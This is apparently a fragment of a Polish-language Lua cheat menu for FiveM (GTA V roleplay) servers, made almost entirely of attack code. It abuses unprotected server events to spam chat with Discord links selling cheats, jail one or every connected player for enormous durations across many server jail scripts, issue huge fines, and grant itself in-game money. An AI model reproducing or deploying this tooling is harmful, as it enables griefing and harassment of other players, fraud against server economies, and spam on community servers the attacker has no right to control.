...
function chatspam()
                TriggerServerEvent(
                    ...
                    'KoGuSzEk#3251',
                    {0, 0x99, 255},
                    '/ooc kogusz menu! Buy at https://discord.gg/v7B6d6C'
                )
                TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/v7B6d6C')
            end
...
Citizen.CreateThread(
    function()
        while bw do
			...
			if koguszspam then
						TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc Zapraszam na discorda <3 https://discord.gg/v7B6d6C')
        ...
        while bw do
            ...
            elseif KoGuSzEk.IsMenuOpened('PlayerOptionsMenu') then
                ...
                elseif KoGuSzEk.B('~h~Wyslij do ~r~Wiezienia') then
                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 999999, 'Zapraszam do kupowania Cheat ds https://discord.gg/FqJDDBn')
                    ...
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'Zapraszam do kupowania Cheat ds https://discord.gg/FqJDDBn')
            ...
            elseif KoGuSzEk.IsMenuOpened('Destroyer') then
                ...
                elseif KoGuSzEk.B('~h~~r~Zamknij~w~ Wszystkich graczy') then
                    for i = 0, 128 do
					TriggerServerEvent("arisonarp:mandat", GetPlayerServerId(i), 32323232323, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C')
						TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 321321312 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 424324234234)
						TriggerServerEvent("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 32135412521, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C')
                        TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 32513251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 321321321321)
						TriggerServerEvent("esx_jailer:wyslijwiezienie", GetPlayerServerId(i), 3251 * 60, '^1Kochać ariesa jebać skaze | pozdro od KoB1x, buziaczki', 32513251)
						TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 3251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C',3251)
						TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^https://discord.gg/v7B6d6C')
						TriggerServerEvent("esx-qale-jail:jailPlayer", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C')
						TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 1 * 60, '', 32)
						TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 3251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C |')
						TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C' )
						TriggerServerEvent("esx_jailer:sendToJail2", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 32513251 )
						TriggerServerEvent('esx_jailer:wysylandoo', 'Garbary123')
						TriggerServerEvent("esx_jailer:wysylanko", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("esx_jailer:wysylandoo", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 32513251, 'Garbary123')
                        TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 32513251 )
                       TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/v7B6d6C', 32513251)
            ...
            elseif KoGuSzEk.IsMenuOpened('wioskarp') then
                if KoGuSzEk.B('~h~~p~»~w~Mandat najblizszego gracza ') then
                    TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(closestPlayer), 200000, '^1Chcesz kupić cheaty zapraszam na ds https://discord.gg/3XjsUfu <3 POZDRAWIAM' )
                elseif KoGuSzEk.B('~h~~p~»~w~Wygrana zdrapki *tost*  ') then
					TriggerServerEvent('givemoney:zdrapka', 100000, 2)
